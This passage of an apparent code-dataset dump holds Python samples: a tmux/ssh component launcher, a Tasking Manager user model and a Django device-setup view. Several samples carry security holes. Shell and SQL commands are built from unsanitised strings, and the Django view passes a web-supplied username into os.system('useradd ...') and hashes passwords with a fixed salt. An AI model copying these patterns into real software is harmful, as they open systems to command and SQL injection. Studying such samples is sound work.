self.host_list.append(host) self.logger.debug(\\\"Saving component to tmp\\\") tmp_comp_path=('%s/%s.yaml' %(TMP_COMP_DIR, comp)) ensure_dir(tmp_comp_path) with open(tmp_comp_path, 'w') as outfile: dump(infile, outfile, default_flow_style=False) self.logger.debug('Copying component \\\"%s\\\" to remote host \\\"%s\\\"' %(comp, host)) cmd=(\\\"ssh %s 'mkdir -p %s' & scp %s %s:%s/%s.yaml\\\" % (host, TMP_SLAVE_DIR, tmp_comp_path, host, TMP_SLAVE_DIR, comp)) self.logger.debug(cmd) send_main_session_command(self.session, cmd) def stop_component(self, comp): if comp['host'] !='localhost' and not self.run_on_localhost(comp): self.logger.debug(\\\"Stopping remote component '%s' on host '%s'\\\" %(comp['name'], comp['host'])) self.stop_remote_component(comp['name'], comp['host']) else: window=find_window(self.session, comp['name']) if window: self.logger.debug(\\\"window '%s' found running\\\" % comp['name']) self.logger.info(\\\"Shutting down window...\\\") kill_window(window) self.logger.info(\\\"... done!\\\") def stop_remote_component(self, comp_name, host): cmd=(\\\"ssh %s 'hyperion --config %s/%s.yaml slave --kill'\\\" %(host, TMP_SLAVE_DIR, comp_name)) self.logger.debug(\\\"Run cmd:\\\\n%s\\\" % cmd) send_main_session_command(self.session, cmd) def start_component(self, comp): node=self.nodes.get(comp['name']) res=[] unres=[] dep_resolve(node, res, unres) for node in res: self.logger.debug(\\\"node name '%s' vs. comp name '%s'\\\" %(node.comp_name, comp['name'])) if node.comp_name !=comp['name']: self.logger.debug(\\\"Checking and starting %s\\\" % node.comp_name) state=self.check_component(node.component) if(state is CheckState.STOPPED_BUT_SUCCESSFUL or state is CheckState.STARTED_BY_HAND or state is CheckState.RUNNING): self.logger.debug(\\\"Component %s is already running, skipping to next in line\\\" % comp['name']) else: self.logger.debug(\\\"Start component '%s' as dependency of '%s'\\\" %(node.comp_name, comp['name'])) self.start_component_without_deps(node.component) tries=0 while True: self.logger.debug(\\\"Checking %s resulted in checkstate %s\\\" %(node.comp_name, state)) state=self.check_component(node.component) if(state is not CheckState.RUNNING or state is not CheckState.STOPPED_BUT_SUCCESSFUL): break if tries > 100: return False tries=tries +1 sleep(.5) self.logger.debug(\\\"All dependencies satisfied, starting '%s'\\\" %(comp['name'])) state=self.check_component(node.component) if(state is CheckState.STARTED_BY_HAND or state is CheckState.RUNNING): self.logger.debug(\\\"Component %s is already running. Skipping start\\\" % comp['name']) else: self.start_component_without_deps(comp) return True def start_component_without_deps(self, comp): if comp['host'] !='localhost' and not self.run_on_localhost(comp): self.logger.debug(\\\"Starting remote component '%s' on host '%s'\\\" %(comp['name'], comp['host'])) self.start_remote_component(comp['name'], comp['host']) else: log_file=(\\\"%s/%s\\\" %(TMP_LOG_PATH, comp['name'])) window=find_window(self.session, comp['name']) if window: self.logger.debug(\\\"Restarting '%s' in old window\\\" % comp['name']) start_window(window, comp['cmd'][0]['start'], log_file, comp['name']) else: self.logger.info(\\\"creating window '%s'\\\" % comp['name']) window=self.session.new_window(comp['name']) start_window(window, comp['cmd'][0]['start'], log_file, comp['name']) def start_remote_component(self, comp_name, host): cmd=(\\\"ssh %s 'hyperion --config %s/%s.yaml slave'\\\" %(host, TMP_SLAVE_DIR, comp_name)) self.logger.debug(\\\"Run cmd:\\\\n%s\\\" % cmd) send_main_session_command(self.session, cmd) def check_component(self, comp): return check_component(comp, self.session, self.logger) def get_dep_list(self, comp): node=self.nodes.get(comp['name']) res=[] unres=[] dep_resolve(node, res, unres) res.remove(node) return res def is_localhost(self, hostname): try: hn_out=socket.gethostbyname(hostname) if hn_out=='127.0.0.1' or hn_out=='::1': self.logger.debug(\\\"Host '%s' is localhost\\\" % hostname) return True else: self.logger.debug(\\\"Host '%s' is not localhost\\\" % hostname) return False except socket.gaierror: sys.exit(\\\"Host '%s' is unknown! Update your /etc/hosts file!\\\" % hostname) def run_on_localhost(self, comp): return self.is_localhost(comp['host']) def kill_remote_session_by_name(self, name, host): cmd=\\\"ssh -t %s 'tmux kill-session -t %s'\\\" %(host, name) send_main_session_command(self.session, cmd) def start_clone_session(self, comp_name, session_name): cmd=\\\"%s '%s' '%s'\\\" %(SCRIPT_CLONE_PATH, session_name, comp_name) send_main_session_command(self.session, cmd) def start_remote_clone_session(self, comp_name, session_name, hostname): remote_cmd=(\\\"%s '%s' '%s'\\\" %(SCRIPT_CLONE_PATH, session_name, comp_name)) cmd=\\\"ssh %s 'bash -s' < %s\\\" %(hostname, remote_cmd) send_main_session_command(self.session, cmd) def draw_graph(self): deps=Digraph(\\\"Deps\\\", strict=True) deps.graph_attr.update(rankdir=\\\"BT\\\") try: node=self.nodes.get('master_node') for current in node.depends_on: deps.node(current.comp_name) res=[] unres=[] dep_resolve(current, res, unres) for node in res: if \\\"depends\\\" in node.component: for dep in node.component['depends']: if dep not in self.nodes: deps.node(dep, color=\\\"red\\\") deps.edge(node.comp_name, dep, \\\"missing\\\", color=\\\"red\\\") elif node.comp_name is not \\\"master_node\\\": deps.edge(node.comp_name, dep) except CircularReferenceException as ex: self.logger.error(\\\"Detected circular dependency reference between %s and %s!\\\" %(ex.node1, ex.node2)) deps.edge(ex.node1, ex.node2, \\\"circular error\\\", color=\\\"red\\\") deps.edge(ex.node2, ex.node1, color=\\\"red\\\") deps.view() class SlaveLauncher: def __init__(self, configfile=None, kill_mode=False, check_mode=False): self.kill_mode=kill_mode self.check_mode=check_mode self.logger=logging.getLogger(__name__) self.logger.setLevel(logging.DEBUG) self.config=None self.session=None if kill_mode: self.logger.info(\\\"started slave with kill mode\\\") if check_mode: self.logger.info(\\\"started slave with check mode\\\") self.server=Server() if self.server.has_session(\\\"slave-session\\\"): self.session=self.server.find_where({ \\\"session_name\\\": \\\"slave-session\\\" }) self.logger.info('found running slave session on server') elif not kill_mode and not check_mode: self.logger.info('starting new slave session on server') self.session=self.server.new_session( session_name=\\\"slave-session\\\" ) else: self.logger.info(\\\"No slave session found on server. Aborting\\\") exit(CheckState.STOPPED) if configfile: self.load_config(configfile) self.window_name=self.config['name'] self.flag_path=(\\\"/tmp/Hyperion/slaves/%s\\\" % self.window_name) self.log_file=(\\\"/tmp/Hyperion/log/%s\\\" % self.window_name) ensure_dir(self.log_file) else: self.logger.error(\\\"No slave component config provided\\\") def load_config(self, filename=\\\"default.yaml\\\"): with open(filename) as data_file: self.config=load(data_file, Loader) def init(self): if not self.config: self.logger.error(\\\" Config not loaded yet!\\\") elif not self.session: self.logger.error(\\\" Init aborted. No session was found!\\\") else: self.logger.debug(self.config) window=find_window(self.session, self.window_name) if window: self.logger.debug(\\\"window '%s' found running\\\" % self.window_name) if self.kill_mode: self.logger.info(\\\"Shutting down window...\\\") kill_window(window) self.logger.info(\\\"... done!\\\") elif not self.kill_mode: self.logger.info(\\\"creating window '%s'\\\" % self.window_name) window=self.session.new_window(self.window_name) start_window(window, self.config['cmd'][0]['start'], self.log_file, self.window_name) else: self.logger.info(\\\"There is no component running by the name '%s'. Exiting kill mode\\\" % self.window_name) def run_check(self): if not self.config: self.logger.error(\\\" Config not loaded yet!\\\") exit(CheckState.STOPPED.value) elif not self.session: self.logger.error(\\\" Init aborted. No session was found!\\\") exit(CheckState.STOPPED.value) check_state=check_component(self.config, self.session, self.logger) exit(check_state.value) def run_component_check(comp): if call(comp['cmd'][1]['check'], shell=True)==0: return True else: return False def check_component(comp, session, logger): logger.debug(\\\"Running component check for %s\\\" % comp['name']) check_available=len(comp['cmd']) > 1 and 'check' in comp['cmd'][1] window=find_window(session, comp['name']) if window: pid=get_window_pid(window) logger.debug(\\\"Found window pid: %s\\\" % pid) procs=[] for entry in pid: procs.extend(Process(entry).children(recursive=True)) pids=[p.pid for p in procs] logger.debug(\\\"Window is running %s child processes\\\" % len(pids)) if len(pids) < 3: logger.debug(\\\"Main window process has finished. Running custom check if available\\\") if check_available and run_component_check(comp): logger.debug(\\\"Process terminated but check was successful\\\") return CheckState.STOPPED_BUT_SUCCESSFUL else: logger.debug(\\\"Check failed or no check available: returning false\\\") return CheckState.STOPPED elif check_available and run_component_check(comp): logger.debug(\\\"Check succeeded\\\") return CheckState.RUNNING elif not check_available: logger.debug(\\\"No custom check specified and got sufficient pid amount: returning true\\\") return CheckState.RUNNING else: logger.debug(\\\"Check failed: returning false\\\") return CheckState.STOPPED else: logger.debug(\\\"%s window is not running. Running custom check\\\" % comp['name']) if check_available and run_component_check(comp): logger.debug(\\\"Component was not started by Hyperion, but the check succeeded\\\") return CheckState.STARTED_BY_HAND else: logger.debug(\\\"Window not running and no check command is available or it failed: returning false\\\") return CheckState.STOPPED def get_window_pid(window): r=window.cmd('list-panes', \\\"-F return[int(p) for p in r.stdout] def kill_session_by_name(server, name): session=server.find_where({ \\\"session_name\\\": name }) session.kill_session() def kill_window(window): window.cmd(\\\"send-keys\\\", \\\"\\\", \\\"C-c\\\") window.kill_window() def start_window(window, cmd, log_file, comp_name): setup_log(window, log_file, comp_name) window.cmd(\\\"send-keys\\\", cmd, \\\"Enter\\\") def find_window(session, window_name): window=session.find_where({ \\\"window_name\\\": window_name }) return window def send_main_session_command(session, cmd): window=find_window(session, \\\"Main\\\") window.cmd(\\\"send-keys\\\", cmd, \\\"Enter\\\") def setup_log(window, file, comp_name): clear_log(file) window.cmd(\\\"send-keys\\\", \\\"exec 2> >(exec tee -i -a '%s')\\\" % file, \\\"Enter\\\") window.cmd(\\\"send-keys\\\", \\\"exec 1> >(exec tee -i -a '%s')\\\" % file, \\\"Enter\\\") window.cmd(\\\"send-keys\\\",('echo \\\" def clear_log(file_path): if os.path.isfile(file_path): os.remove(file_path) def ensure_dir(file_path): directory=os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory) def main(): logger=logging.getLogger(__name__) logger.setLevel(logging.DEBUG) parser=argparse.ArgumentParser() parser.add_argument(\\\"--config\\\", '-c', type=str, default='test.yaml', help=\\\"YAML config file. see sample-config.yaml. Default: test.yaml\\\") subparsers=parser.add_subparsers(dest=\\\"cmd\\\") subparser_editor=subparsers.add_parser('edit', help=\\\"Launches the editor to edit or create new systems and \\\" \\\"components\\\") subparser_run=subparsers.add_parser('run', help=\\\"Launches the setup specified by the --config argument\\\") subparser_val=subparsers.add_parser('validate', help=\\\"Validate the setup specified by the --config argument\\\") subparser_remote=subparsers.add_parser('slave', help=\\\"Run a component locally without controlling it. The \\\" \\\"control is taken care of the remote master invoking \\\" \\\"this command.\\\\nIf run with the --kill flag, the \\\" \\\"passed component will be killed\\\") subparser_val.add_argument(\\\"--visual\\\", help=\\\"Generate and show a graph image\\\", action=\\\"store_true\\\") remote_mutex=subparser_remote.add_mutually_exclusive_group(required=False) remote_mutex.add_argument('-k', '--kill', help=\\\"switch to kill mode\\\", action=\\\"store_true\\\") remote_mutex.add_argument('-c', '--check', help=\\\"Run a component check\\\", action=\\\"store_true\\\") args=parser.parse_args() logger.debug(args) if args.cmd=='edit': logger.debug(\\\"Launching editor mode\\\") elif args.cmd=='run': logger.debug(\\\"Launching runner mode\\\") cc=ControlCenter(args.config) cc.init() start_gui(cc) elif args.cmd=='validate': logger.debug(\\\"Launching validation mode\\\") cc=ControlCenter(args.config) if args.visual: cc.set_dependencies(False) cc.draw_graph() else: cc.set_dependencies(True) elif args.cmd=='slave': logger.debug(\\\"Launching slave mode\\\") sl=SlaveLauncher(args.config, args.kill, args.check) if args.check: sl.run_check() else: sl.init() def start_gui(control_center): app=QtGui.QApplication(sys.argv) main_window=QtGui.QMainWindow() ui=hyperGUI.UiMainWindow() ui.ui_init(main_window, control_center) main_window.show() sys.exit(app.exec_()) \",\n          \"\\nimport geojson import datetime import dateutil.parser from server import db from sqlalchemy import desc from server.models.dtos.user_dto import UserDTO, UserMappedProjectsDTO, MappedProject, UserFilterDTO, Pagination, \\\\ UserSearchQuery, UserSearchDTO, ProjectParticipantUser, ListedUser from server.models.postgis.licenses import License, users_licenses_table from server.models.postgis.project_info import ProjectInfo from server.models.postgis.statuses import MappingLevel, ProjectStatus, UserRole from server.models.postgis.utils import NotFound, timestamp class User(db.Model): \\\"\\\"\\\" Describes the history associated with a task \\\"\\\"\\\" __tablename__=\\\"users\\\" id=db.Column(db.BigInteger, primary_key=True, index=True) validation_message=db.Column(db.Boolean, default=True, nullable=False) username=db.Column(db.String, unique=True) role=db.Column(db.Integer, default=0, nullable=False) mapping_level=db.Column(db.Integer, default=1, nullable=False) projects_mapped=db.Column(db.Integer, default=1, nullable=False) tasks_mapped=db.Column(db.Integer, default=0, nullable=False) tasks_validated=db.Column(db.Integer, default=0, nullable=False) tasks_invalidated=db.Column(db.Integer, default=0, nullable=False) projects_mapped=db.Column(db.ARRAY(db.Integer)) email_address=db.Column(db.String) is_email_verified=db.Column(db.Boolean, default=False) is_expert=db.Column(db.Boolean, default=False) twitter_id=db.Column(db.String) facebook_id=db.Column(db.String) linkedin_id=db.Column(db.String) date_registered=db.Column(db.DateTime, default=timestamp) last_validation_date=db.Column(db.DateTime, default=timestamp) accepted_licenses=db.relationship(\\\"License\\\", secondary=users_licenses_table) def create(self): \\\"\\\"\\\" Creates and saves the current model to the DB \\\"\\\"\\\" db.session.add(self) db.session.commit() def save(self): db.session.commit() def get_by_id(self, user_id: int): \\\"\\\"\\\" Return the user for the specified id, or None if not found \\\"\\\"\\\" return User.query.get(user_id) def get_by_username(self, username: str): \\\"\\\"\\\" Return the user for the specified username, or None if not found \\\"\\\"\\\" return User.query.filter_by(username=username).one_or_none() def update_username(self, username: str): \\\"\\\"\\\" Update the username \\\"\\\"\\\" self.username=username db.session.commit() def update(self, user_dto: UserDTO): \\\"\\\"\\\" Update the user details \\\"\\\"\\\" self.email_address=user_dto.email_address.lower() if user_dto.email_address else None self.twitter_id=user_dto.twitter_id.lower() if user_dto.twitter_id else None self.facebook_id=user_dto.facebook_id.lower() if user_dto.facebook_id else None self.linkedin_id=user_dto.linkedin_id.lower() if user_dto.linkedin_id else None self.validation_message=user_dto.validation_message db.session.commit() def set_email_verified_status(self, is_verified: bool): \\\"\\\"\\\" Updates email verfied flag on successfully verified emails\\\"\\\"\\\" self.is_email_verified=is_verified db.session.commit() def set_is_expert(self, is_expert: bool): \\\"\\\"\\\" Enables or disables expert mode on the user\\\"\\\"\\\" self.is_expert=is_expert db.session.commit() @staticmethod def get_all_users(query: UserSearchQuery) -> UserSearchDTO: \\\"\\\"\\\" Search and filter all users \\\"\\\"\\\" base=db.session.query(User.id, User.username, User.mapping_level, User.role) if query.mapping_level: base=base.filter(User.mapping_level==MappingLevel[query.mapping_level.upper()].value) if query.username: base=base.filter(User.username.ilike(query.username.lower() +'%')) if query.role: base=base.filter(User.role==UserRole[query.role.upper()].value) results=base.order_by(User.username).paginate(query.page, 20, True) dto=UserSearchDTO() for result in results.items: listed_user=ListedUser() listed_user.id=result.id listed_user.mapping_level=MappingLevel(result.mapping_level).name listed_user.username=result.username listed_user.role=UserRole(result.role).name dto.users.append(listed_user) dto.pagination=Pagination(results) return dto @staticmethod def get_all_users_not_pagainated(): \\\"\\\"\\\" Get all users in DB\\\"\\\"\\\" return db.session.query(User.id).all() @staticmethod def filter_users(user_filter: str, project_id: int, page: int) -> UserFilterDTO: \\\"\\\"\\\" Finds users that matches first characters, for auto-complete. Users who have participated(mapped or validated) in the project, if given, will be returned ahead of those who have not. \\\"\\\"\\\" results=db.session.query(User.username, User.projects_mapped.any(project_id).label(\\\"participant\\\")) \\\\ .filter(User.username.ilike(user_filter.lower() +'%')) \\\\ .order_by(desc(\\\"participant\\\").nullslast(), User.username).paginate(page, 20, True) if results.total==0: raise NotFound() dto=UserFilterDTO() for result in results.items: dto.usernames.append(result.username) if project_id is not None: participant=ProjectParticipantUser() participant.username=result.username participant.project_id=project_id participant.is_participant=bool(result.participant) dto.users.append(participant) dto.pagination=Pagination(results) return dto @staticmethod def upsert_mapped_projects(user_id: int, project_id: int): \\\"\\\"\\\" Adds projects to mapped_projects if it doesn't exist \\\"\\\"\\\" sql=\\\"select * from users where id={0} and projects_mapped @> '{{{1}}}'\\\".format(user_id, project_id) result=db.engine.execute(sql) if result.rowcount > 0: return sql='''update users set projects_mapped=array_append(projects_mapped,{0}) where id={1}'''.format(project_id, user_id) db.engine.execute(sql) @staticmethod def get_mapped_projects(user_id: int, preferred_locale: str) -> UserMappedProjectsDTO: \\\"\\\"\\\" Get all projects a user has mapped on \\\"\\\"\\\" sql='''SELECT p.id, p.status, p.default_locale, c.mapped, c.validated, st_asgeojson(p.centroid) FROM projects p, (SELECT coalesce(v.project_id, m.project_id) project_id, coalesce(v.validated, 0) validated, coalesce(m.mapped, 0) mapped FROM(SELECT t.project_id, count(t.validated_by) validated FROM tasks t WHERE t.project_id IN(SELECT unnest(projects_mapped) FROM users WHERE id={0}) AND t.validated_by={0} GROUP BY t.project_id, t.validated_by) v FULL OUTER JOIN (SELECT t.project_id, count(t.mapped_by) mapped FROM tasks t WHERE t.project_id IN(SELECT unnest(projects_mapped) FROM users WHERE id={0}) AND t.mapped_by={0} GROUP BY t.project_id, t.mapped_by) m ON v.project_id=m.project_id) c WHERE p.id=c.project_id ORDER BY p.id DESC'''.format(user_id) results=db.engine.execute(sql) if results.rowcount==0: raise NotFound() mapped_projects_dto=UserMappedProjectsDTO() for row in results: mapped_project=MappedProject() mapped_project.project_id=row[0] mapped_project.status=ProjectStatus(row[1]).name mapped_project.tasks_mapped=row[3] mapped_project.tasks_validated=row[4] mapped_project.centroid=geojson.loads(row[5]) project_info=ProjectInfo.get_dto_for_locale(row[0], preferred_locale, row[2]) mapped_project.name=project_info.name mapped_projects_dto.mapped_projects.append(mapped_project) return mapped_projects_dto def set_user_role(self, role: UserRole): \\\"\\\"\\\" Sets the supplied role on the user \\\"\\\"\\\" self.role=role.value db.session.commit() def set_mapping_level(self, level: MappingLevel): \\\"\\\"\\\" Sets the supplied level on the user \\\"\\\"\\\" self.mapping_level=level.value db.session.commit() def accept_license_terms(self, license_id: int): \\\"\\\"\\\" Associate the user in scope with the supplied license \\\"\\\"\\\" image_license=License.get_by_id(license_id) self.accepted_licenses.append(image_license) db.session.commit() def has_user_accepted_licence(self, license_id: int): \\\"\\\"\\\" Test to see if the user has accepted the terms of the specified license\\\"\\\"\\\" image_license=License.get_by_id(license_id) if image_license in self.accepted_licenses: return True return False def delete(self): \\\"\\\"\\\" Delete the user in scope from DB \\\"\\\"\\\" db.session.delete(self) db.session.commit() def as_dto(self, logged_in_username: str) -> UserDTO: \\\"\\\"\\\" Create DTO object from user in scope \\\"\\\"\\\" user_dto=UserDTO() user_dto.id=self.id user_dto.username=self.username user_dto.role=UserRole(self.role).name user_dto.mapping_level=MappingLevel(self.mapping_level).name user_dto.is_expert=self.is_expert or False user_dto.date_registered=str(self.date_registered) try: user_dto.projects_mapped=len(self.projects_mapped) except: user_dto.projects_mapped=0 user_dto.tasks_mapped=self.tasks_mapped user_dto.tasks_validated=self.tasks_validated user_dto.tasks_invalidated=self.tasks_invalidated user_dto.twitter_id=self.twitter_id user_dto.linkedin_id=self.linkedin_id user_dto.facebook_id=self.facebook_id user_dto.validation_message=self.validation_message user_dto.total_time_spent=0 user_dto.time_spent_mapping=0 user_dto.time_spent_validating=0 sql=\\\"\\\"\\\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history WHERE action='LOCKED_FOR_VALIDATION' and user_id={0};\\\"\\\"\\\".format(self.id) total_validation_time=db.engine.execute(sql) for row in total_validation_time: total_validation_time=row[0] if total_validation_time: total_validation_seconds=total_validation_time.total_seconds() user_dto.time_spent_validating=total_validation_seconds user_dto.total_time_spent +=user_dto.time_spent_validating sql=\\\"\\\"\\\"SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history WHERE action='LOCKED_FOR_MAPPING' and user_id={0};\\\"\\\"\\\".format(self.id) total_mapping_time=db.engine.execute(sql) for row in total_mapping_time: total_mapping_time=row[0] if total_mapping_time: total_mapping_seconds=total_mapping_time.total_seconds() user_dto.time_spent_mapping=total_mapping_seconds user_dto.total_time_spent +=user_dto.time_spent_mapping if self.username==logged_in_username: user_dto.email_address=self.email_address user_dto.is_email_verified=self.is_email_verified return user_dto \"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"sourceWithComments\",\n      \"properties\": {\n        \"dtype\": \"category\",\n        \"num_unique_values\": 16,\n        \"samples\": [\n          \"from django.shortcuts import render\\nfrom django.http import HttpResponse, JsonResponse\\nfrom django.views.decorators.csrf import csrf_exempt\\n\\nfrom rest_framework.renderers import JSONRenderer\\nfrom rest_framework.parsers import JSONParser\\nfrom rest_framework.response import Response\\nfrom rest_framework import viewsets\\nfrom rest_framework.decorators import list_route\\nfrom flask import escape\\n\\nfrom .models import BoxDetails, RegisteredServices\\nfrom .serializers import BoxDetailsSerializer, RegisteredServicesSerializer\\n\\nimport common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd \\n\\n# fetch network AP details\\nnm = NetworkManager.NetworkManager\\nwlans = [d for d in nm.Devices if isinstance(d, NetworkManager.Wireless)]\\n\\ndef get_osversion():\\n    \\\"\\\"\\\"\\n    PRETTY_NAME of your Titania os (in lowercase).\\n    \\\"\\\"\\\"\\n    with open(\\\"/etc/os-release\\\") as f:\\n        osfilecontent = f.read().split(\\\"\\\\n\\\")\\n        # $PRETTY_NAME is at the 5th position\\n        version = osfilecontent[4].split('=')[1].strip('\\\\\\\"')\\n        return version\\n\\ndef get_allconfiguredwifi():\\n    \\\"\\\"\\\"\\n    nmcli con | grep 802-11-wireless\\n    \\\"\\\"\\\"\\n    ps = subprocess.Popen('nmcli -t -f NAME,TYPE conn | grep 802-11-wireless', shell=True,stdout=subprocess.PIPE).communicate()[0]\\n    wifirows = ps.split('\\\\n')\\n    wifi = []\\n    for row in wifirows:\\n        name = row.split(':')\\n        print(name)\\n        wifi.append(name[0])\\n    return wifi\\n\\ndef get_allAPs():\\n    \\\"\\\"\\\"\\n    nmcli con | grep 802-11-wireless\\n    \\\"\\\"\\\"\\n    ps = subprocess.Popen('nmcli -t -f SSID,BARS device wifi list', shell=True,stdout=subprocess.PIPE).communicate()[0]\\n    wifirows = ps.split('\\\\n')\\n    wifi = []\\n    for row in wifirows:\\n        entry = row.split(':')\\n        print(entry)\\n        wifi.append(entry)\\n    return wifi\\n    # wifi_aps = []   \\n    # for dev in wlans:\\n    #     for ap in dev.AccessPoints:\\n    #         wifi_aps.append(ap.Ssid)\\n    # return wifi_aps\\n\\ndef add_user(username, password):\\n    encPass = crypt.crypt(password,\\\"22\\\")\\n    os.system(\\\"useradd -G docker,wheel -p \\\"+encPass+\\\" \\\"+username)\\n\\ndef add_newWifiConn(wifiname, wifipass):\\n    print(wlans)\\n    wlan0 = wlans[0]\\n    print(wlan0)\\n    print(wifiname)\\n    # get selected ap as currentwifi\\n    for dev in wlans:\\n        for ap in dev.AccessPoints:\\n            if ap.Ssid == wifiname:\\n                currentwifi = ap\\n    print(currentwifi)\\n    # params to set password\\n    params = {\\n            \\\"802-11-wireless\\\": {\\n                \\\"security\\\": \\\"802-11-wireless-security\\\",\\n            },\\n            \\\"802-11-wireless-security\\\": {\\n                \\\"key-mgmt\\\": \\\"wpa-psk\\\",\\n                \\\"psk\\\": wifipass\\n            },\\n        }\\n    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi)        \\n\\ndef delete_WifiConn(wifiap):\\n    \\\"\\\"\\\"\\n    nmcli connection delete id <connection name>\\n    \\\"\\\"\\\"\\n    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiap], stdout=subprocess.PIPE)\\n    print(ps)\\n\\ndef edit_WifiConn(wifiname, wifipass):\\n    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiname], stdout=subprocess.PIPE)\\n    print(ps)\\n    print(wlans)\\n    wlan0 = wlans[0]\\n    print(wlan0)\\n    print(wifiname)\\n    # get selected ap as currentwifi\\n    for dev in wlans:\\n        for ap in dev.AccessPoints:\\n            if ap.Ssid == wifiname:\\n                currentwifi = ap\\n    # params to set password\\n    params = {\\n            \\\"802-11-wireless\\\": {\\n                \\\"security\\\": \\\"802-11-wireless-security\\\",\\n            },\\n            \\\"802-11-wireless-security\\\": {\\n                \\\"key-mgmt\\\": \\\"wpa-psk\\\",\\n                \\\"psk\\\": wifipass\\n            },\\n        }\\n    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi) \\n    return       \\n\\n@csrf_exempt\\ndef handle_config(request):\\n    \\\"\\\"\\\"\\n    List all code snippets, or create a new snippet.\\n    \\\"\\\"\\\" \\n    if request.method == 'POST':\\n        action = request.POST.get(\\\"_action\\\")\\n        print(action)\\n        if action == 'registerService':\\n            request_name = request.POST.get(\\\"name\\\")\\n            request_address = request.POST.get(\\\"address\\\")\\n            request_icon = request.POST.get(\\\"icon\\\")\\n            print(request_name)\\n            print(request_address)\\n            print(request_icon)\\n            setServiceDetails = RegisteredServices.objects.get_or_create(name=request_name,address=request_address,icon=request_icon)\\n            return JsonResponse({\\\"STATUS\\\":\\\"SUCCESS\\\"}, safe=False)\\n        elif action == 'getSchema':\\n            schema = get_osversion()\\n            return JsonResponse({\\\"version_info\\\":schema}, safe=False)\\n        elif action == 'getIfConfigured':\\n            print(action)\\n            queryset = BoxDetails.objects.all()\\n            serializer = BoxDetailsSerializer(queryset, many=True)\\n            return JsonResponse(serializer.data, safe=False)\\n        elif action == 'loadDependencies':\\n            print(action)\\n            queryset = RegisteredServices.objects.all()\\n            serializer = RegisteredServicesSerializer(queryset, many=True)\\n            return JsonResponse(serializer.data, safe=False)\\n        elif action == 'getAllAPs':\\n            wifi_aps = get_allAPs()\\n            return JsonResponse(wifi_aps, safe=False)\\n        elif action == 'saveUserDetails':\\n            print(action)\\n            boxname = escape(request.POST.get(\\\"boxname\\\"))\\n            username = escape(request.POST.get(\\\"username\\\"))\\n            password = escape(request.POST.get(\\\"password\\\"))\\n            print(username)\\n            add_user(username,password)\\n            setBoxName = BoxDetails(boxname=boxname)\\n            setBoxName.save()\\n            # connect to wifi ap user selected\\n            wifi_pass = request.POST.get(\\\"wifi_password\\\")\\n            wifi_name = request.POST.get(\\\"wifi_ap\\\")\\n            if len(wifi_name) > 0:\\n                add_newWifiConn(wifi_name,wifi_pass)\\n            return JsonResponse({\\\"STATUS\\\":\\\"SUCCESS\\\"}, safe=False)\\n        elif action == 'login':\\n            print(action)\\n            username = escape(request.POST.get(\\\"username\\\"))\\n            password = escape(request.POST.get(\\\"password\\\"))\\n            output=''\\n            \\\"\\\"\\\"Tries to authenticate a user.\\n            Returns True if the authentication succeeds, else the reason\\n            (string) is returned.\\\"\\\"\\\"\\n            try:\\n                enc_pwd = spwd.getspnam(username)[1]\\n                if enc_pwd in [\\\"NP\\\", \\\"!\\\", \\\"\\\", None]:\\n                    output = \\\"User '%s' has no password set\\\" % username\\n                if enc_pwd in [\\\"LK\\\", \\\"*\\\"]:\\n                    output = \\\"account is locked\\\"\\n                if enc_pwd == \\\"!!\\\":\\n                    output = \\\"password has expired\\\"\\n                # Encryption happens here, the hash is stripped from the\\n                # enc_pwd and the algorithm id and salt are used to encrypt\\n                # the password.\\n                if crypt.crypt(password, enc_pwd) == enc_pwd:\\n                    output = ''\\n                else:\\n                    output = \\\"incorrect password\\\"\\n            except KeyError:\\n                output = \\\"User '%s' not found\\\" % username\\n            if len(output) == 0:\\n                return JsonResponse({\\\"username\\\":username}, safe=False)\\n            else:\\n                return JsonResponse(output, safe=False)\\n        elif action == 'logout':\\n            print(action)\\n            username = request.POST.get(\\\"username\\\")\\n            print(username+' ')\\n            queryset = User.objects.all().first()\\n            if username == queryset.username:\\n                return JsonResponse({\\\"STATUS\\\":\\\"SUCCESS\\\", \\\"username\\\":queryset.username}, safe=False)\\n        elif action == 'getDashboardCards':\\n            print(action)\\n            con = sqlite3.connect(\\\"dashboard.sqlite3\\\")\\n            cursor = con.cursor()\\n            cursor.execute(common.Q_DASHBOARD_CARDS)\\n            rows = cursor.fetchall()\\n            print(rows)\\n            return JsonResponse(rows, safe=False)\\n        elif action == 'getDashboardChart':\\n            print(action)\\n            con = sqlite3.connect(\\\"dashboard.sqlite3\\\")\\n            cursor = con.cursor()\\n            cursor.execute(common.Q_GET_CONTAINER_ID)\\n            rows = cursor.fetchall()\\n            print(rows)\\n            finalset = []\\n            for row in rows:\\n                cursor.execute(common.Q_GET_DASHBOARD_CHART,[row[0],])\\n                datasets = cursor.fetchall()\\n                print(datasets)\\n                data = {'container_name' : row[1], 'data': datasets}\\n                finalset.append(data)\\n            return JsonResponse(finalset, safe=False)\\n        elif action == 'getDockerOverview':\\n            print(action)\\n            con = sqlite3.connect(\\\"dashboard.sqlite3\\\")\\n            cursor = con.cursor()\\n            cursor.execute(common.Q_GET_DOCKER_OVERVIEW)\\n            rows = cursor.fetchall()\\n            print(rows)\\n            finalset = []\\n            for row in rows:\\n                data = {'state': row[0], 'container_id': row[1], 'name': row[2],\\n                        'image': row[3], 'running_for': row[4],\\n                        'command': row[5], 'ports': row[6],\\n                        'status': row[7], 'networks': row[8]}\\n                finalset.append(data)\\n            return JsonResponse(finalset, safe=False)\\n        elif action == 'getContainerStats':\\n            print(action)\\n            con = sqlite3.connect(\\\"dashboard.sqlite3\\\")\\n            cursor = con.cursor()\\n            cursor.execute(common.Q_GET_CONTAINER_ID)\\n            rows = cursor.fetchall()\\n            print(rows)\\n            finalset = []\\n            datasets_io = []\\n            datasets_mem = []\\n            datasets_perc = []\\n            for row in rows:\\n                datasets_io = []\\n                datasets_mem = []\\n                datasets_perc = []\\n                # values with % appended to them\\n                for iter in range(0,2):\\n                    cursor.execute(common.Q_GET_CONTAINER_STATS_CPU,[row[0],iter+1])\\n                    counter_val = 